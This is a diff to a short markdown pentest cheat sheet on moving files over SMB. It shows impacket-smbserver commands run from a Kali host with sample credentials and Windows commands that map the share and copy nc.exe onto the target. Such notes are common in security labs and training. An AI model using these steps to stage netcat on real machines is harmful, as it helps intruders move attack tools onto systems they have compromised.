@@ -1,7 +1,5 @@
 # SMB
 
-
-
 ```
 # Kali side
 impacket-smbserver share . -smb2support -username USER -password PASS
@@ -110,3 +108,25 @@ kali> impacket-smbserver -smb2support <sharename> .
 win> copy file \\KaliIP\sharename
 ```
 
+
+
+
+
+
+
+
+
+
+
+#############################
+
+## SMB Server
+-> Setting
+```
+impacket-smbserver share . -smb2support -user user -password teste321
+```
+-> Transfer
+```
+net use \\<smbserver>\share /USER:user teste321
+copy \\<smbserver>\share\nc.exe .
+```
